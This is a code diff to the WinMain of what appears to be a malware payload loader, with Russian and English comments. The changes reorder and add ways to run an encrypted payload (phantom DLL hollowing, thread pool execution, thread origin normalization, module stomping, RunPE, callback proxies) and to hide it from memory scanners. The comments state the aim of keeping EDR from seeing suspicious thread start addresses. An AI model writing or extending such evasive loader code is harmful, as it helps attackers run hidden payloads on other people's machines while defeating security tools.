@@ -340,8 +340,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     // ── Step 8b: Anti-Memory Scanning (L14 + L16) ──
     // Трёхуровневая защита от сканеров памяти:
-    //   Layer 1: Phantom DLL Backing (MEM_IMAGE) — активируется при выполнении
-    //   Layer 2: Thread Origin Normalization — активируется при выполнении
+    //   Layer 1: Phantom DLL Backing (MEM_IMAGE) — bPhantomDLL в Step 9
+    //   Layer 2: Thread Origin Normalization — bThreadPool/bCallbackDiv/bThreadNormalization в Step 9
     //   Layer 3: Guard Page + XOR ре-шифрация — активируется сейчас
     if (GlobalConfig.bAntiMemScan) {
         AntiMemScan::Enable(EncryptedPayload, decryptSize, finalKey, sizeof(finalKey));
@@ -351,14 +351,24 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 9: Execute Payload ──
+    // Порядок приоритета: Phantom(L1) > ThreadPool(L2) > ThreadNorm(L2) >
+    //   ModuleStomp > RunPE > CallbackDiv(L2) > Fibers > default
     if (GlobalConfig.bPhantomDLL) {
-        // L16: Phantom DLL Hollowing — execute from signed DLL memory
+        // Layer 1: Phantom DLL Hollowing — execute from signed DLL memory
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         Phantom::Execute(EncryptedPayload, decryptSize);
     }
     else if (GlobalConfig.bThreadPool) {
-        // L12: Thread Pool Execution — execute via TpAllocWork
+        // Layer 2: Thread Pool Execution — execute via TpAllocWork
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        ThreadPool::Execute(EncryptedPayload, decryptSize);
+    }
+    else if (GlobalConfig.bThreadNormalization) {
+        // Layer 2: Thread Origin Normalization — автороутинг через ThreadPool
+        // Поток стартует из ntdll (TpAllocWork callback), EDR не видит
+        // подозрительный thread start address в нашем .exe
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         ThreadPool::Execute(EncryptedPayload, decryptSize);
@@ -374,7 +384,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         GodMode::ExecutePayload(EncryptedPayload, decryptSize, false, true);
     }
     else if (GlobalConfig.bCallbackDiv) {
-        // Callback Diversification — use callback proxy
+        // Layer 2: Callback Diversification — thread из kernel32 callback
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
         GodMode::Internal::CallbackProxy(EncryptedPayload, decryptSize);
